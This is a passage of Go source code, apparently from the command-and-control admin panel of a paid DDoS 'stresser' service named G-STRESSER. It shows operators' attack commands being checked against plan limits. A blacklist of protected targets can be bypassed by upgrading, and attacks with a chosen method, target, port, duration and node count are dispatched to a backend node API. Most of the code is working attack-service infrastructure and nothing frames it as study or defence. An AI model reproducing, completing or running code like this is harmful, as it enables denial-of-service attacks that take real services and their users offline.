							this.conn.Write([]byte(color.HiYellowString("[WARNING] NODE LIMIT EXCEEDED. CAPPING TO YOUR PLAN MAX (%d)\r\n", userInfo.concs)))
						} else {
							requestedConc = c
						}
					}
				}

				if can, err := database.CanLaunchAttack(username, duration, cmd); !can {
					this.conn.Write([]byte(ClrRed + fmt.Sprintf("%s\r\n\n", err.Error()) + ClrReset))
				} else {
					isBlacklisted := database.ContainsWhitelistedTargets(target)
					if !isBlacklisted || userInfo.bypassBlacklist {
						success, apiMsg := StartNewAttack(username, cmd_upper, target, port, duration, requestedConc)
						if success {
							this.conn.Write([]byte("\033[2J\033[1H"))
							this.conn.Write([]byte("\r\n"))
							this.conn.Write([]byte(ClrHiGreen + " [SUCCESS] INTERFACE SYNCED! ATTACK DISPATCHED TO NODES\r\n" + ClrReset))
							this.conn.Write([]byte("\r\n"))

							spaces := 32
							fLen := len(username)
							leftSpaces := (spaces - fLen) / 2
							rightSpaces := spaces - fLen - leftSpaces
							format_name := fmt.Sprintf("%s%s%s", SafeRepeat(" ", leftSpaces), username, SafeRepeat(" ", rightSpaces))

							fLen = len(cmd_upper)
							leftSpaces = (spaces - fLen) / 2
							rightSpaces = spaces - fLen - leftSpaces
							format_method := fmt.Sprintf("%s%s%s", SafeRepeat(" ", leftSpaces), cmd_upper, SafeRepeat(" ", rightSpaces))

							fLen = len(fmt.Sprintf("%s:%d", target, port))
							leftSpaces = (spaces - fLen) / 2
							rightSpaces = spaces - fLen - leftSpaces
							format_target := fmt.Sprintf("%s%s:%d%s", SafeRepeat(" ", leftSpaces), target, port, SafeRepeat(" ", rightSpaces))

							fLen = len(fmt.Sprintf("%ds", duration))
							leftSpaces = (spaces - fLen) / 2
							rightSpaces = spaces - fLen - leftSpaces
							format_duration := fmt.Sprintf("%s%ds%s", SafeRepeat(" ", leftSpaces), duration, SafeRepeat(" ", rightSpaces))

							fLen = len(fmt.Sprintf("%d Nodes", requestedConc))
							leftSpaces = (spaces - fLen) / 2
							rightSpaces = spaces - fLen - leftSpaces
							format_conc := fmt.Sprintf("%s%d Nodes%s", SafeRepeat(" ", leftSpaces), requestedConc, SafeRepeat(" ", rightSpaces))

							this.conn.Write([]byte(bgGreen(ClrBlack+"        Operator     ") + bgBlack(ClrWhite+format_name+ClrReset) + "          " + NeonPurpleGreen("██████╗      ███████╗\r\n")))
							this.conn.Write([]byte(bgGreen(ClrBlack+"        Method       ") + bgBlack(ClrWhite+format_method+ClrReset) + "          " + NeonPurpleGreen("██╔════╝      ██╔════╝\r\n")))
							this.conn.Write([]byte(bgGreen(ClrBlack+"        Target       ") + bgBlack(ClrWhite+format_target+ClrReset) + "          " + NeonPurpleGreen("██║  ███╗████╗███████╗\r\n")))
							this.conn.Write([]byte(bgGreen(ClrBlack+"        Duration     ") + bgBlack(ClrWhite+format_duration+ClrReset) + "          " + NeonPurpleGreen("██║   ██║╚═══╝╚════██║\r\n")))
							this.conn.Write([]byte(bgGreen(ClrBlack+"        Scaling      ") + bgBlack(ClrWhite+format_conc+ClrReset) + "          " + NeonPurpleGreen("╚██████╔╝     ███████║\r\n")))
							this.conn.Write([]byte("                     " + SafeRepeat(" ", len(format_duration)) + "          " + NeonPurpleGreen(" ╚═════╝      ╚══════╝\r\n")))
							this.conn.Write([]byte("\r\n\n"))

						} else {
							this.conn.Write([]byte(ClrRed + fmt.Sprintf("[CRITICAL] NODE SYNC FAILURE: %s\r\n\n", strings.ToUpper(apiMsg)) + ClrReset))
						}
					} else {
						this.conn.Write([]byte(ClrRed + fmt.Sprintf("[DENIED] PROTECTED ASSET: TARGET IS WHITELISTED BY G-STRESSER. UPGRADE TO [%s] TO BYPASS.\r\n", userInfo.NextBypassPlan) + ClrReset))
					}
				}
			} else {
				this.conn.Write([]byte(ClrRed + "[UNKNOWN COMMAND] TYPE 'HELP' FOR ASSISTANCE OR 'METHODS' FOR VECTORS\r\n\n" + ClrReset))
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 2048)
	bufPos := 0
	for {
		if bufPos > 2043 {
			return "", *new(error)
		}
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			_, _ = this.conn.Read(buf[bufPos : bufPos+1])
			_, _ = this.conn.Read(buf[bufPos : bufPos+1])
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("•"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
}
func RoundUp(input float64, places int) (newVal float64) {
	var round float64
	pow := math.Pow(10, float64(places))
	digit := pow * input
	round = math.Ceil(digit)
	newVal = round / pow
	return
}
func ByteFormat(inputNum float64, precision int) string {

	if precision <= 0 {
		precision = 1
	}
	var unit string
	var returnVal float64

	if inputNum >= 1000000000000000000000000 {
		returnVal = RoundUp((inputNum / 1208925819614629174706176), precision)
		unit = " YB" // yottabyte
	} else if inputNum >= 1000000000000000000000 {
		returnVal = RoundUp((inputNum / 1180591620717411303424), precision)
		unit = " ZB" // zettabyte
	} else if inputNum >= 10000000000000000000 {
		returnVal = RoundUp((inputNum / 1152921504606846976), precision)
		unit = " EB" // exabyte
	} else if inputNum >= 1000000000000000 {
		returnVal = RoundUp((inputNum / 1125899906842624), precision)
		unit = " PB" // petabyte
	} else if inputNum >= 1000000000000 {
		returnVal = RoundUp((inputNum / 1099511627776), precision)
		unit = " TB" // terrabyte
	} else if inputNum >= 1000000000 {
		returnVal = RoundUp((inputNum / 1073741824), precision)
		unit = " GB" // gigabyte
	} else if inputNum >= 1000000 {
		returnVal = RoundUp((inputNum / 1048576), precision)
		unit = " MB" // megabyte
	} else if inputNum >= 1000 {
		returnVal = RoundUp((inputNum / 1024), precision)
		unit = " KB" // kilobyte
	} else {
		returnVal = inputNum
		unit = " bytes" // byte
	}
	return strconv.FormatFloat(returnVal, 'f', precision, 64) + unit
}

func IsValidIPv4(ip string) bool {
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return false
	}
	return parsedIP.To4() != nil
}

func IsValidUrl(urlStr string) bool {
	parsedUrl, err := url.Parse(urlStr)
	return err == nil && parsedUrl.Scheme != "" && parsedUrl.Host != ""
}

func IsValidMethod(method string) bool {
	return GetMethodType(method) != ""
}

func GetMethodType(method string) string {
	methodsPath := filepath.Join(database.base_dir, "..", "database", "methods.json")
	mdata, err := ioutil.ReadFile(methodsPath)
	if err != nil {
		return ""
	}
	var mJson map[string]map[string]interface{}
	if err := json.Unmarshal(mdata, &mJson); err == nil {
		for _, layerMethods := range mJson {
			if m, exists := layerMethods[strings.ToUpper(method)]; exists {
				if mObj, ok := m.(map[string]interface{}); ok {
					if t, ok := mObj["Type"].(string); ok {
						return strings.ToLower(t)
					}
					if t, ok := mObj["type"].(string); ok {
						return strings.ToLower(t)
					}
				}
			}
		}
	}
	return ""
}

func StartNewAttack(username, method_type string, target string, port int, duration int, conc int) (bool, string) {
	apiKey := database.GetAPIKey(username)
	if apiKey == "" {
		return false, "Failed to grab Internal key for operator"
	}

	url_req := "http://localhost:8880/api/attack"
	params := url.Values{}
	params.Add("method", method_type)
	params.Add("host", target)
	params.Add("port", fmt.Sprintf("%d", port))
	params.Add("time", fmt.Sprintf("%d", duration))
	params.Add("conc", fmt.Sprintf("%d", conc))
	params.Add("key", apiKey)

	url_req = fmt.Sprintf("%s?%s", url_req, params.Encode())

	req, err := http.NewRequest("GET", url_req, nil)
	if err != nil {
		return false, "Failed to create request"
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return false, "Backend API Connection Timeout"
	}
	defer resp.Body.Close()

	responseBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, "Failed to read API response"
	}

	var apiRes map[string]interface{}
	json.Unmarshal(responseBody, &apiRes)

	if success, ok := apiRes["success"].(bool); ok && success {
		color.Green("New Attack Dispatched via Node API: [%s] %s %s:%d for %ds", username, method_type, target, port, duration)
		return true, ""
	}

	if msg, ok := apiRes["message"].(string); ok {
		return false, msg
	}

	return false, "Internal Backend Handshake Error"
}
